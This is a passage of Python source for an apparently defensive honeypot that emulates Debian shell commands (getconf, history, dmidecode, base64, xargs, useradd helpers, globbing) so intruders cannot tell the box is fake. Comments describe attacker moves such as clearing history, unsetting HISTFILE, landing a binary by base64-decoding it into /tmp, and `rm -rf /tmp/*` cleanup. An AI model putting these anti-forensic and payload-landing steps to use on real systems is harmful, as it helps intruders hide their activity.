            "_NPROCESSORS_ONLN": str(NCPU), "NPROCESSORS_ONLN": str(NCPU),
            "_PHYS_PAGES": str(MEMINFO["MemTotal"] // 4),
            "_AVPHYS_PAGES": str(MEMINFO["MemFree"] // 4),
        }
        dyn.update(cache)
        out = []
        for line in _GETCONF_TABLE.strip("\n").split("\n"):
            name, _, val = line.partition("\t")
            if val == "@PERSONA@":
                val = dyn.get(name, "")
            elif name in dyn:
                val = dyn[name]
            out.append((name, val))
        return out

    def cmd_getconf(self, a, stdin=""):
        """getconf(1). It was five variables and silence for the rest.

        Silence is the problem. `getconf _NPROCESSORS_ONLN` answered 4 while
        `getconf _NPROCESSORS_CONF` answered nothing and /proc/cpuinfo
        answered 4 -- three ways of asking one question, one of them mute.
        `getconf -a` printed zero lines where the real one prints 322.

        A miner's installer reads CLK_TCK to turn jiffies into seconds and
        _PHYS_PAGES to size its own allocation; both were empty, and an
        empty answer is not a wrong number, it is an obviously fake box.
        """
        args = list(a)
        # -v SPEC selects a standard; the values we carry do not differ
        # between specifications, so it is accepted and ignored.
        if len(args) >= 2 and args[0] == "-v":
            args = args[2:]
        if not args:
            self.err(self._GETCONF_USAGE.rstrip("\n"))
            return "", 2
        vals = self._getconf_values()
        if args[0] == "-a":
            # A pathname after -a is allowed and changes nothing here.
            return "".join("%-34s %s\n" % (n, v) for n, v in vals), 0
        name = args[0]
        table = dict(vals)
        if name not in table:
            self.err("getconf: Unrecognized variable `%s'" % name)
            return "", 2
        if len(args) == 1 and name in self._GETCONF_PATHCONF:
            self.err(self._GETCONF_USAGE.rstrip("\n"))
            return "", 2
        val = table[name]
        # An entry with no value is a variable the platform does not define.
        # Real getconf says so rather than printing a blank line.
        return (val if val else "undefined") + "\n", 0

    def cmd_history(self, a, stdin=""):
        """`history`, and the clearing of it that follows.

        Two things were wrong. A non-interactive shell has no history at
        all -- bash only reads the file for an interactive one -- so
        `ssh host history` should print nothing and printed the seeded
        file instead. And `history -c` emptied only the session list while
        the file-derived lines stayed, so the count was identical before
        and after: clearing history is the first thing an actor does on
        the way out, and they check.

        Measured on the guest through a pty: the file's 8 lines plus 2
        session commands give 10, and `history -c; history | wc -l` gives
        1 -- the clear leaves the command that did it.
        """
        if a and a[0] == "-c":
            self.history = []
            self._hist_cleared = True
            return "", 0
        if self.exec_mode:
            # No history in a non-interactive shell.
            return "", 0
        lines = []
        if not getattr(self, "_hist_cleared", False):
            path = "/root/.bash_history" if self.user == "root" \
                else "/home/%s/.bash_history" % self.user
            d = (self.fs.read(path) or b"").decode("latin-1")
            lines = [l for l in d.splitlines() if l.strip()]
        # The session's own commands belong in here. Without them, `history`
        # was a fixed list that never mentioned anything the attacker typed.
        lines += list(getattr(self, "history", []))
        if a and a[0].isdigit():
            lines = lines[-int(a[0]):]
        return "".join("%5d  %s\n" % (i, l)
                       for i, l in enumerate(lines, 1)), 0

    def cmd_systemd_detect_virt(self, a, stdin=""):
        """kvm for the VM question, none for the container one.

        Every form answered "kvm" with status 0, including `-c`, which asks
        *only* about containers -- so the box claimed to be a container and
        a KVM guest at once, and the standard "am I in a container" check
        got a yes. Status matters too: it is 1 when there is nothing to
        report, which is what the shell idiom tests."""
        quiet = bool({"-q", "--quiet"} & set(a))
        if {"-c", "--container"} & set(a):
            return ("" if quiet else "none\n"), 1
        if {"-v", "--vm"} & set(a):
            return ("" if quiet else "kvm\n"), 0
        if {"--cvm"} & set(a):
            return ("" if quiet else "none\n"), 1
        if {"-r", "--chroot"} & set(a):
            return "", 1
        return ("" if quiet else "kvm\n"), 0

    def cmd_dmidecode(self, a, stdin=""):
        # Read from the same table /sys/class/dmi/id is generated from.
        d = VFS.DMI
        table = {"system-product-name": d["product_name"],
                 "system-manufacturer": d["sys_vendor"],
                 "system-version": d["product_version"],
                 "system-serial-number": d["product_serial"],
                 "system-uuid": d["product_uuid"],
                 "system-family": d["product_family"],
                 "baseboard-manufacturer": d["board_vendor"],
                 "baseboard-product-name": d["board_name"],
                 "bios-vendor": d["bios_vendor"],
                 "bios-version": d["bios_version"],
                 "bios-release-date": d["bios_date"],
                 "chassis-manufacturer": d["chassis_vendor"],
                 "chassis-type": "Other",
                 "processor-family": "Other",
                 "processor-manufacturer": "Intel",
                 "processor-version": CPU_MODEL}
        if len(a) >= 2 and a[0] == "-s":
            if a[1] in table:
                return table[a[1]] + "\n", 0
            self.err("dmidecode: Invalid string keyword: %s" % a[1])
            return "", 1
        head = ("# dmidecode 3.4\nGetting SMBIOS data from sysfs.\n"
                "SMBIOS 2.8 present.\n")
        # -t printed the header and stopped, so `dmidecode -t system` --
        # the standard "what am I running on" -- answered with two lines
        # and no data, on a box whose /sys/class/dmi/id is fully populated.
        # The tables are rendered from that same directory.
        want = None
        for i, x in enumerate(a):
            if x == "-t" and i + 1 < len(a):
                want = a[i + 1].lower()
            elif x.startswith("-t") and len(x) > 2:
                want = x[2:].lower()
        blocks = [
            ("0", "bios", "BIOS Information", (
                ("Vendor", d["bios_vendor"]),
                ("Version", d["bios_version"]),
                ("Release Date", d["bios_date"]),
                ("Address", "0xE8000"),
                ("Runtime Size", "96 kB"),
                ("ROM Size", "64 kB"),
                ("BIOS Revision", "0.0"))),
            ("1", "system", "System Information", (
                ("Manufacturer", d["sys_vendor"]),
                ("Product Name", d["product_name"]),
                ("Version", d["product_version"]),
                ("Serial Number", d["product_serial"]),
                ("UUID", d["product_uuid"]),
                ("Wake-up Type", "Power Switch"),
                ("SKU Number", d.get("product_sku", "Not Specified")),
                ("Family", d["product_family"]))),
            ("2", "baseboard", "Base Board Information", (
                ("Manufacturer", d["board_vendor"]),
                ("Product Name", d["board_name"]),
                ("Version", d["board_version"]),
                ("Serial Number", d["board_serial"]))),
            ("3", "chassis", "Chassis Information", (
                ("Manufacturer", d["chassis_vendor"]),
                ("Type", "Other"),
                ("Lock", "Not Present"),
                ("Version", d["chassis_version"]),
                ("Serial Number", d["chassis_serial"]))),
            ("4", "processor", "Processor Information", (
                ("Socket Designation", "CPU 0"),
                ("Type", "Central Processor"),
                ("Family", "Other"),
                ("Manufacturer", "Intel"),
                ("Version", CPU_MODEL),
                ("Voltage", "Unknown"),
                ("External Clock", "Unknown"),
                ("Max Speed", "2000 MHz"),
                ("Current Speed", "2000 MHz"),
                ("Status", "Populated, Enabled"),
                ("Core Count", str(NCPU)),
                ("Thread Count", str(NCPU)))),
            ("17", "memory", "Memory Device", (
                ("Array Handle", "0x1000"),
                ("Size", "%d MB" % (MEM_TOTAL_KB // 1024 + 13)),
                ("Form Factor", "DIMM"),
                ("Locator", "DIMM 0"),
                ("Bank Locator", "Not Specified"),
                ("Type", "RAM"),
                ("Speed", "Unknown"),
                ("Manufacturer", "QEMU"))),
        ]
        chosen = blocks
        if want:
            chosen = [b for b in blocks if want in (b[0], b[1])]
            if not chosen:
                self.err("dmidecode: Invalid type keyword: %s" % want)
                return "", 1
        out = [head]
        for i, (typ, _kw, title, fields) in enumerate(chosen):
            out.append("\nHandle 0x%04X, DMI type %s, %d bytes\n%s\n"
                       % (0x0100 + int(typ), typ,
                          20 + len(fields) * 3, title))
            for k, v in fields:
                out.append("\t%s: %s\n" % (k, v))
        return "".join(out), 0

    def cmd_seq(self, a, stdin=""):
        try:
            nums = [int(x) for x in a if not x.startswith("-")]
        except ValueError:
            return "", 1
        if len(nums) == 1:
            rng = range(1, nums[0] + 1)
        elif len(nums) == 2:
            rng = range(nums[0], nums[1] + 1)
        elif len(nums) == 3:
            rng = range(nums[0], nums[2] + 1, nums[1])
        else:
            return "", 1
        # Bounded at source: dispatch's truncation cannot help here because the
        # whole string is built before it ever returns.
        out, n = [], 0
        for i in rng:
            line = "%d\n" % i
            n += len(line)
            if n > MAX_OUTPUT:
                break
            out.append(line)
        return "".join(out), 0

    _EXPR_CMP = {"=": lambda x, y: x == y, "!=": lambda x, y: x != y,
                 "<": lambda x, y: x < y, "<=": lambda x, y: x <= y,
                 ">": lambda x, y: x > y, ">=": lambda x, y: x >= y}

    def cmd_expr(self, a, stdin=""):
        """expr's comparisons are not shell arithmetic.

        `expr 1 = 1` was handed to arith_eval, where `=` is assignment, so it
        printed 0 and exited 1 -- the exact inverse of the truth. expr prints
        1 or 0 and exits 0 when the result is neither null nor zero, which is
        backwards from every other command and is why scripts use it.
        """
        if not a:
            self.err("expr: missing operand")
            return "", 2
        if len(a) == 2 and a[0] == "length":
            out = str(len(a[1]))
            return out + "\n", 0 if out != "0" else 1
        if len(a) == 3 and a[1] in self._EXPR_CMP:
            l, op, r = a[0], a[1], a[2]
            try:
                res = self._EXPR_CMP[op](int(l), int(r))
            except ValueError:
                res = self._EXPR_CMP[op](l, r)
            return ("1\n" if res else "0\n"), 0 if res else 1
        try:
            val = arith_eval(" ".join(a), lambda k: self.vars.get(k, "0"))
        except Exception:
            self.err("expr: syntax error")
            return "", 2
        return "%d\n" % val, 0 if val != 0 else 1

    def cmd_rev(self, a, stdin=""):
        data, _ = self._input(a, stdin)
        # _input records what it could not read and every caller was
        # discarding it, so a missing file exited 0 where coreutils
        # exits 1. The second return value is the file list, not a
        # status: testing it directly failed every named file.
        if self._input_missing:
            for _m in self._input_missing:
                # rev words it differently from the rest of coreutils:
                # "cannot open X", not just "X".
                self.err("rev: cannot open %s: No such file or directory"
                         % _m)
            return "", 1
        return "".join(l[::-1] + "\n" for l in data.splitlines()), 0

    def _sum(self, a, stdin, algo):
        flags, _v, files = self.parse_opts(a)
        # -c verifies a digest file. It was treated as just another operand, so
        # `sha1sum -c sums.txt` hashed the *list* and printed a digest of it,
        # which looks like success and is not.
        if "-c" in flags or "--check" in flags:
            out, rc, bad = [], 0, 0
            for f in files:
                body = self.fs.read(VFS.norm(f, self.cwd))
                if body is None:
                    self.err("%ssum: %s: No such file or directory"
                             % (algo, f))
                    rc = 1
                    continue
                for line in body.decode("latin-1").splitlines():
                    m = re.match(r"([0-9a-fA-F]+)\s+[* ]?(.+)$", line.strip())
                    if not m:
                        continue
                    want, name = m.group(1).lower(), m.group(2)
                    data = self.fs.read(VFS.norm(name, self.cwd))
                    if data is None:
                        out.append("%s: FAILED open or read\n" % name)
                        bad += 1
                        continue
                    got = hashlib.new(algo, data).hexdigest()
                    if got == want:
                        out.append("%s: OK\n" % name)
                    else:
                        out.append("%s: FAILED\n" % name)
                        bad += 1
            if bad:
                self.err("%ssum: WARNING: %d computed checksum%s did NOT match"
                         % (algo, bad, "" if bad == 1 else "s"))
                rc = 1
            return "".join(out), rc
        out = []
        if files:
            for f in files:
                d = self.fs.read(VFS.norm(f, self.cwd))
                if d is None:
                    self.err("%ssum: %s: No such file or directory" % (algo, f))
                    return "", 1
                out.append("%s  %s\n" % (hashlib.new(algo, d).hexdigest(), f))
        else:
            # latin-1, the way every other string-to-bytes step in this
            # shell converts: a bare .encode() is utf-8, so `md5sum < f` and
            # `cat f | md5sum` hashed a *different* byte sequence than
            # `md5sum f` for any file with a byte above 0x7F. Verifying a
            # transferred payload is exactly what these are used for, and
            # the two spellings disagreed on every binary.
            out.append("%s  -\n" % hashlib.new(
                algo, stdin.encode("latin-1", "replace")).hexdigest())
        return "".join(out), 0

    def cmd_md5sum(self, a, stdin=""):
        return self._sum(a, stdin, "md5")

    def cmd_sha1sum(self, a, stdin=""):
        return self._sum(a, stdin, "sha1")

    def cmd_sha256sum(self, a, stdin=""):
        return self._sum(a, stdin, "sha256")

    def cmd_base64(self, a, stdin=""):
        import base64 as _b64
        # -w takes its value, and _input was called without saying so: the
        # width was collected as a second input file, the read of "0"
        # failed, and `echo hi | base64 -w 0` produced nothing at all. The
        # error was discarded by the caller, so the failure was silent --
        # and -w 0 is how a script gets one unwrapped line to paste into a
        # command.
        data, _ = self._input(a, stdin, value_opts=("-w", "--wrap"))
        # Bounded by what was actually read. Encoding is 4/3 of the input
        # *plus* a newline every -w columns, and 4/3 alone left the encode
        # short by exactly those newlines, so the decode came back short
        # too. Doubling covers either direction with room to spare, and the
        # hard ceiling in dispatch is what actually limits it.
        if data:
            self._bounded_out = len(data) * 2 + 4096
        # _input records what it could not read and every caller was
        # discarding it, so a missing file exited 0 where coreutils
        # exits 1. The second return value is the file list, not a
        # status: testing it directly failed every named file.
        if self._input_missing:
            for _m in self._input_missing:
                self.err("%s: %s: No such file or directory"
                         % ("base64", _m))
            return "", 1
        short = "".join(x[1:] for x in a
                        if x.startswith("-") and not x.startswith("--"))
        # `base64 -di` is the idiom loaders use, because -i tolerates the
        # line noise a copy-paste leaves behind. Testing for the exact
        # token "-d" missed every bundled form, so -di *encoded*.
        if "d" in short or "--decode" in a:
            # -i drops characters outside the alphabet; it does not make
            # invalid input valid. coreutils decodes the whole 4-character
            # groups it has, writes them, and *then* reports the failure
            # with status 1 -- so a corrupted stage yields partial bytes
            # and an error, not silence and not success. This decoded the
            # garbage and exited 0 either way, which made a truncated
            # payload look like a clean one.
            import re as _re
            raw = "".join(data.split())
            ignore = "i" in short or "--ignore-garbage" in a
            if ignore:
                raw = "".join(c for c in raw
                              if c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                              "abcdefghijklmnopqrstuvwxyz0123456789+/=")
            elif not _re.fullmatch(r"[A-Za-z0-9+/]*={0,2}", raw):
                self.err("base64: invalid input")
                return "", 1
            # Padding counts towards the length: a valid string is a whole
            # number of 4-character groups *including* any "=". Validating
            # after stripping the padding rejected every correctly padded
            # input, which is most of them.
            whole = len(raw) - (len(raw) % 4)
            try:
                # latin-1, not utf-8: it is the exact inverse of the
                # encode below, and it is the only codec that maps all 256
                # byte values one-to-one. Decoding as utf-8 with "replace"
                # turned every byte sequence that is not valid utf-8 into
                # U+FFFD and collapsed multi-byte runs into one character,
                # so `base64 -d` did not round-trip binary at any size -- a
                # 1000-byte random file came back wrong, and an 8MB one
                # came back 5% short. Landing an ELF with
                # `echo <b64> | base64 -d > /tmp/x` is the most common way
                # there is to get a binary through a shell, and it produced
                # a corrupted file *and* a corrupted capture of it.
                out = _b64.b64decode(raw[:whole]).decode("latin-1")
            except Exception:
                self.err("base64: invalid input")
                return "", 1
            if len(raw) % 4:
                # coreutils writes the groups it managed and then reports
                # the failure, so a truncated payload yields partial bytes
                # and status 1 -- not silence, and not success.
                self.err("base64: invalid input")
                return out, 1
            return out, 0
        enc = _b64.b64encode(data.encode("latin-1", "replace")).decode()
        # -w0 means "no wrapping"; it was ignored, so piping into `base64 -w0`
        # produced line breaks the caller did not expect.
        _f, vals, _o = self.parse_opts(a, value_opts=("-w",),
                                       long_value=("--wrap",))
        try:
            wrap = int(vals.get("-w", vals.get("--wrap", 76)))
        except ValueError:
            wrap = 76
        if wrap <= 0:
            return enc, 0
        return "".join(enc[i:i + wrap] + "\n"
                       for i in range(0, len(enc), wrap)) or "\n", 0

    def cmd_xargs(self, a, stdin=""):
        # -n and -I were parsed as part of the command, so `xargs -n1 echo`
        # ran `-n1 echo ...` and produced nothing at all.
        # -0 has to come out before parse_opts, which would otherwise read it
        # as the numeric count form (-N) and leave xargs splitting on spaces.
        null_sep = "-0" in a or "--null" in a
        a = [x for x in a if x not in ("-0", "--null")]
        # xargs' own options stop at the first word of the command, and
        # everything after it belongs to that command. Parsing the whole
        # line meant `xargs -I{} sh -c "..."` lost the -c: sh was handed the
        # script as its argv[0] and answered "No such file or directory".
        _VAL = ("-n", "-I", "-d", "-P", "-s", "-L", "-a")
        _LVAL = ("--max-args", "--replace", "--delimiter", "--max-procs",
                 "--max-lines")
        head, i = [], 0
        while i < len(a):
            x = a[i]
            if not x.startswith("-"):
                break
            head.append(x)
            if x in _VAL or x in _LVAL:
                if i + 1 < len(a):
                    head.append(a[i + 1])
                    i += 1
            i += 1
        flags, vals, _rest = self.parse_opts(
            head, value_opts=_VAL, long_value=_LVAL)
        cmd = list(a[i:])
        delim = vals.get("-d", vals.get("--delimiter"))
        if delim == "\\n":
            delim = "\n"
        if null_sep:
            items = [x for x in stdin.split("\0") if x]
        elif delim:
            items = [x for x in stdin.split(delim) if x != ""]
        else:
            items = stdin.split()
        no_run_empty = "-r" in flags or "--no-run-if-empty" in flags
        if not items and (no_run_empty or not cmd):
            return "", 0
        repl = vals.get("-I", vals.get("--replace"))
        if "-i" in flags:
            repl = repl or "{}"
        base = cmd or ["echo"]
        # xargs resolves the command itself and names itself when it is not
        # there: "xargs: nosuchcmd: No such file or directory", rc 127. It
        # dispatched blind, so the caller saw bash's "command not found"
        # from a shell that was never involved.
        rc = self.wrapper_missing("xargs", base[0])
        if rc:
            return "", rc
        out = []
        worst = 0

        def note(rc):
            """xargs has its own exit convention: 123 if any invocation
            exited 1-125, 124 if one exited 255, 125 if one was killed, and
            the command's own status only for 126/127. We returned the raw
            status of the last run, so `xargs false` gave 1 where real xargs
            gives 123."""
            nonlocal worst
            if rc in (126, 127):
                worst = rc
            elif rc == 255:
                worst = max(worst, 124)
            elif 1 <= rc <= 125:
                worst = max(worst, 123)
            return rc

        # -t echoes each command to stderr before running it. It was
        # accepted and ignored, so a script that turns it on to show what
        # it is about to delete showed nothing -- and the operator reading
        # that output cannot tell a no-op from a run.
        trace = "-t" in flags or "--verbose" in flags

        def _trace(argv):
            if trace:
                self.err(" ".join(argv))

        if repl:
            # One run per item, with the placeholder substituted.
            for item in items:
                argv = [w.replace(repl, item) for w in base]
                _trace(argv)
                out.append(self.run(" ".join(self._shq(w) for w in argv)))
                note(self.last_rc)
            return "".join(out), worst
        per = vals.get("-n", vals.get("--max-args"))
        size = int(per) if per and str(per).isdigit() else 0
        groups = ([items[i:i + size] for i in range(0, len(items), size)]
                  if size else [items])
        for g in groups:
            argv = base + g
            _trace(argv)
            out.append(self.run(" ".join(self._shq(w) for w in argv)))
            note(self.last_rc)
        return "".join(out), worst

    @staticmethod
    def _shq(word):
        """Quote a word so re-parsing it as shell input yields the same word."""
        if word and re.fullmatch(r"[A-Za-z0-9_@%+=:,./-]+", word):
            return word
        return "'" + word.replace("'", "'\\''") + "'"

    class _Break(Exception):
        pass

    class _Continue(Exception):
        pass

    def cmd_break(self, a, stdin=""):
        self._brk = True
        return "", 0

    def cmd_continue(self, a, stdin=""):
        self._cont = True
        return "", 0

    # The setuid helpers that ship with passwd(1) and util-linux. The files are
    # on the disk because a real Debian has them; without handlers, running one
    # produced silence, and an existing invariant flagged them as orphaned.
    def cmd_chage(self, a, stdin=""):
        if "-l" in a:
            user = [x for x in a if not x.startswith("-")]
            user = user[-1] if user else self.user
            line = [l for l in (self.fs.read("/etc/shadow") or b"")
                    .decode("latin-1").splitlines() if l.startswith(user + ":")]
            if not line:
                self.err("chage: user '%s' does not exist in /etc/passwd" % user)
                return "", 1
            f = line[0].split(":")
            last = int(f[2]) if len(f) > 2 and f[2].isdigit() else 0
            return ("Last password change\t\t\t\t\t: %s\n"
                    "Password expires\t\t\t\t\t: never\n"
                    "Password inactive\t\t\t\t\t: never\n"
                    "Account expires\t\t\t\t\t\t: never\n"
                    "Minimum number of days between password change\t\t: 0\n"
                    "Maximum number of days between password change\t\t: 99999\n"
                    "Number of days of warning before password expires\t: 7\n"
                    % time.strftime("%b %d, %Y", time.gmtime(last * 86400)), 0)
        if self.user != "root":
            self.err("chage: Permission denied.")
            return "", 1
        self.err("chage: PAM: Authentication token manipulation error")
        return "", 1

    def cmd_chsh(self, a, stdin=""):
        self.log(event="chsh", argv=" ".join(a)[:200])
        self.err("Changing the login shell for %s" % self.user)
        self.err("chsh: PAM: Authentication failure")
        return "", 1

    def cmd_chfn(self, a, stdin=""):
        self.log(event="chfn", argv=" ".join(a)[:200])
        self.err("Changing the user information for %s" % self.user)
        self.err("chfn: PAM: Authentication failure")
        return "", 1

    def cmd_expiry(self, a, stdin=""):
        if "-c" in a:
            return "", 0
        self.err("expiry: cannot open /etc/shadow")
        return "", 1

    def _login_defs_home_mode(self):
        """The mode useradd gives a new home.

        HOME_MODE wins if login.defs sets one -- Debian's does, at 0700 --
        and only otherwise does it fall back to 0777 & ~UMASK. The file had
        no HOME_MODE at all, so the umask path was the only one there was
        and a new home came out 0755 next to a /home/deploy of 0700.
        """
        body = (self.fs.read("/etc/login.defs") or b"").decode("latin-1")
        m = re.search(r"^HOME_MODE\s+0?([0-7]{3})\s*$", body, re.M)
        if m:
            return int(m.group(1), 8)
        return 0o777 & ~self._login_defs_umask()

    def _subid_add(self, name):
        """Give a new account its subordinate uid/gid range.

        useradd hands out SUB_UID_COUNT ids starting past the last range in
        the file; the two files move together. Nothing wrote them, so a box
        with accounts had no /etc/subuid at all.
        """
        body = (self.fs.read("/etc/login.defs") or b"").decode("latin-1")
        def _defs(key, dflt):
            m = re.search(r"^%s\s+(\d+)" % key, body, re.M)
            return int(m.group(1)) if m else dflt
        start, count = _defs("SUB_UID_MIN", 100000), _defs("SUB_UID_COUNT",
                                                           65536)
        for path in ("/etc/subuid", "/etc/subgid"):
            cur = (self.fs.read(path) or b"").decode("latin-1")
            if any(l.split(":")[0] == name for l in cur.splitlines() if l):
                continue
            top = start
            for line in cur.splitlines():
                f = line.split(":")
                if len(f) == 3 and f[1].isdigit() and f[2].isdigit():
                    top = max(top, int(f[1]) + int(f[2]))
            self.fs.write(path, (cur + "%s:%d:%d\n" % (name, top, count))
                          .encode(), mode=0o644)

    def _subid_del(self, name):
        for path in ("/etc/subuid", "/etc/subgid"):
            cur = (self.fs.read(path) or b"").decode("latin-1")
            keep = [l for l in cur.splitlines()
                    if l and l.split(":")[0] != name]
            self.fs.write(path, ("\n".join(keep) + ("\n" if keep else ""))
                          .encode(), mode=0o644)

    def _login_defs_umask(self):
        """UMASK out of /etc/login.defs, so useradd and the file agree."""
        for line in (self.fs.read("/etc/login.defs") or b"").decode(
                "latin-1").splitlines():
            f = line.split()
            if len(f) == 2 and f[0] == "UMASK":
                try:
                    return int(f[1], 8)
                except ValueError:
                    break
        return 0o022

    def cmd_gpasswd(self, a, stdin=""):
        """gpasswd -a / -d are membership changes, not password changes.

        Every invocation fell through to "Changing the password for group",
        so `gpasswd -a bob sudo` -- one of the two ordinary ways to grant
        sudo, the other being usermod -aG -- printed a PAM failure and
        changed nothing, while the same request through usermod worked.
        """
        self.log(event="gpasswd", argv=" ".join(a)[:200])
        if self._shadow_needs_root("gpasswd"):
            return "", 1
        rest = [x for x in a if not x.startswith("-")]
        add = "-a" in a or "--add" in a
        delete = "-d" in a or "--delete" in a
        if (add or delete) and len(rest) >= 2:
            user, group = rest[0], rest[1]
            grp = (self.fs.read("/etc/group") or b"").decode("latin-1")
            if not any(l.split(":")[0] == group for l in grp.splitlines()):
                self.err("gpasswd: group '%s' does not exist" % group)
                return "", 2
            pw = (self.fs.read("/etc/passwd") or b"").decode("latin-1")
            if not any(l.split(":")[0] == user for l in pw.splitlines()):
                self.err("gpasswd: user '%s' does not exist" % user)
                return "", 2
            if add:
                self._group_add_member([group], user)
                self.log(event="usermod", username=user, groups=group,
                         via="gpasswd")
                return "gpasswd: user %s added to group %s\n" % (user, group), 0
            lines = grp.splitlines()
            for i, line in enumerate(lines):
                f = line.split(":")
                if len(f) > 3 and f[0] == group:
                    f[3] = ",".join(m for m in f[3].split(",")
                                    if m and m != user)
                    lines[i] = ":".join(f)
                    break
            self.fs.write("/etc/group",
                          ("\n".join(lines) + "\n").encode("latin-1"))
            return ("gpasswd: user %s removed from group %s\n"
                    % (user, group)), 0
        if not rest:
            self.err("Usage: gpasswd [option] GROUP")
            return "", 2
        self.err("Changing the password for group %s" % rest[-1])
        self.err("gpasswd: PAM: Authentication failure")
        return "", 1

    def cmd_newgrp(self, a, stdin=""):
        self.log(event="newgrp", argv=" ".join(a)[:200])
        if a and a[0] not in ("root",) and self.user != "root":
            self.err("newgrp: Permission denied")
            return "", 1
        # A successful newgrp starts a fresh shell; we just carry on.
        return "", 0
    cmd_sg = cmd_newgrp

    def cmd_write(self, a, stdin=""):
        target = a[0] if a else ""
        self.log(event="write", target=target, message=stdin[:400])
        if not a:
            self.err("usage: write user [tty]")
            return "", 1
        if not any(r[0] == target for r in self._utmp()):
            self.err("write: %s is not logged in" % target)
            return "", 1
        return "", 0

    def cmd_diff(self, a, stdin=""):
        """diffutils is priority:required on Debian, so `diff` has to exist --
        and `diff <(a) <(b)` is the standard way to check two files agree."""
        import difflib
        unified = any(x.startswith("-") and "u" in x for x in a) or \
            "--unified" in a
        brief = any(x.startswith("-") and "q" in x for x in a)
        files = [x for x in a if not x.startswith("-")]
        if len(files) < 2:
            self.err("diff: missing operand after '%s'"
                     % (files[0] if files else "diff"))
            self.err("diff: Try 'diff --help' for more information.")
            return "", 2
        bodies = []
        for f in files[:2]:
            path = VFS.norm(f, self.cwd)
            data = self.fs.read(path)
            if data is None:
                self.err("diff: %s: No such file or directory" % f)
                return "", 2
            bodies.append(data.decode("latin-1").splitlines(keepends=True))
        if bodies[0] == bodies[1]:
            return "", 0
        if brief:
            return "Files %s and %s differ\n" % (files[0], files[1]), 1
        if unified:
            out = difflib.unified_diff(bodies[0], bodies[1],
                                       fromfile=files[0], tofile=files[1],
                                       lineterm="\n")
            return "".join(out), 1
        # The default "normal" format: 3c3 / < old / --- / > new
        out = []
        sm = difflib.SequenceMatcher(None, bodies[0], bodies[1])
        for tag, i1, i2, j1, j2 in sm.get_opcodes():
            if tag == "equal":
                continue
            lhs = str(i1 + 1) if i2 - i1 <= 1 else "%d,%d" % (i1 + 1, i2)
            rhs = str(j1 + 1) if j2 - j1 <= 1 else "%d,%d" % (j1 + 1, j2)
            if tag == "replace":
                out.append("%sc%s\n" % (lhs, rhs))
            elif tag == "delete":
                out.append("%sd%d\n" % (lhs, j1))
            else:
                out.append("%da%s\n" % (i1, rhs))
            for line in bodies[0][i1:i2]:
                out.append("< " + line)
            if tag == "replace":
                out.append("---\n")
            for line in bodies[1][j1:j2]:
                out.append("> " + line)
        return "".join(out), 1

    def cmd_cmp(self, a, stdin=""):
        silent = any(x.startswith("-") and ("s" in x) for x in a)
        files = [x for x in a if not x.startswith("-")]
        if len(files) < 2:
            self.err("cmp: missing operand after '%s'"
                     % (files[0] if files else "cmp"))
            return "", 2
        raw = []
        for f in files[:2]:
            data = self.fs.read(VFS.norm(f, self.cwd))
            if data is None:
                self.err("cmp: %s: No such file or directory" % f)
                return "", 2
            raw.append(data)
        if raw[0] == raw[1]:
            return "", 0
        if silent:
            return "", 1
        for i, (x, y) in enumerate(zip(raw[0], raw[1]), 1):
            if x != y:
                line = raw[0][:i].count(b"\n") + 1
                return ("%s %s differ: byte %d, line %d\n"
                        % (files[0], files[1], i, line)), 1
        shorter = files[0] if len(raw[0]) < len(raw[1]) else files[1]
        self.err("cmp: EOF on %s which is empty" % shorter
                 if not min(raw, key=len) else
                 "cmp: EOF on %s after byte %d" % (shorter, min(map(len, raw))))
        return "", 1

    def cmd_eval(self, a, stdin=""):
        return self.run(" ".join(a), stdin), self.last_rc

    def cmd_local(self, a, stdin=""):
        """A local really is local now. It used to assign globally, so a
        function using `local tmp` clobbered the caller's tmp -- which changes
        what a script does, not merely how it looks."""
        frame = self._local_stack[-1] if self._local_stack else None
        for item in a:
            k, eq, v = item.partition("=")
            k = k.strip()
            if not k:
                continue
            if frame is not None and k not in frame:
                frame[k] = self.vars.get(k, None)
            self.vars[k] = self.expand(v) if eq else ""
        return "", 0

    def cmd_return(self, a, stdin=""):
        self._ret = True
        try:
            return "", int(a[0]) if a else 0
        except (ValueError, IndexError):
            return "", 0

    def cmd_unset(self, a, stdin=""):
        rc = 0
        for k in a:
            if k in self.readonly_vars:
                self.err("bash: unset: %s: cannot unset: readonly variable"
                         % k)
                rc = 1
                continue
            self.vars.pop(k, None)
            # A variable the shell computes on demand has to stay unset
            # once someone unsets it, or `unset HISTFILE` -- the first move
            # in covering your tracks -- reads back as still set.
            self._unset_dynamic.add(k)
        return "", rc

    # -- builtins bash always has -------------------------------------------
    #
    # "bash: exec: command not found" is impossible on a real box, so every one
    # of these is a giveaway when missing -- more so than an absent binary,
    # which at least happens on a minimal install.

    def _gv(self):
        return lambda k: self.vars.get(k, "0")

    _GLOB_CHARS = ("*", "?", "[")

    def _glob(self, word):
        """Expand one word against the VFS. Returns a list of words.

        Missing entirely until now: `echo *` printed a literal asterisk and
        `rm -rf /tmp/*` matched nothing, which is a giveaway the moment anyone
        cleans up after themselves.
        """
        if GLOB_LIT in word:
            # Any metacharacter that survived as literal makes this word
            # unglobbable; hand back the plain text.
            bare = _glob_unmark(word)
            if not any(c in _glob_strip_marked(word)
                       for c in self._GLOB_CHARS):
                return [bare]
        if not any(c in _glob_strip_marked(word) for c in self._GLOB_CHARS):
            return [_glob_unmark(word)]
        import fnmatch
        word = _glob_unmark(word)
        shopts = getattr(self, "_shopts", {})
        if shopts.get("globstar") and "**" in word:
            # `**` crosses directories. Without this `shopt -s globstar`
            # was accepted and `/var/www/**/*.php` matched one level, which
            # is the same answer a shell that ignored the option gives.
            return self._globstar(word)
        absolute = word.startswith("/")
        base = "/" if absolute else self.cwd
        parts = [p for p in word.strip("/").split("/") if p != ""]
        if not parts:
            return [word]
        cur = ["/"] if absolute else [self.cwd]
        for seg in parts:
            nxt = []
            if not any(c in seg for c in self._GLOB_CHARS):
                for d in cur:
                    cand = (d.rstrip("/") + "/" + seg) if d != "/" else "/" + seg
                    if self.fs.exists(cand):
                        nxt.append(cand)
                cur = nxt
                continue
            for d in cur:
                # Same collation ls uses. Plain sorted() is ASCII order, so
                # `echo *` put X.TXT before a.txt where a box with
                # LANG=en_US.UTF-8 puts it after x2.
                for name in sorted(self.fs.listdir(d) or [],
                                   key=lambda n: (_collate(n), n)):
                    # A leading dot is only matched by an explicit dot --
                    # unless dotglob is set, which is exactly what an
                    # attacker sets before `rm -rf /tmp/*`.
                    if (name.startswith(".") and not seg.startswith(".")
                            and not shopts.get("dotglob")):
                        continue
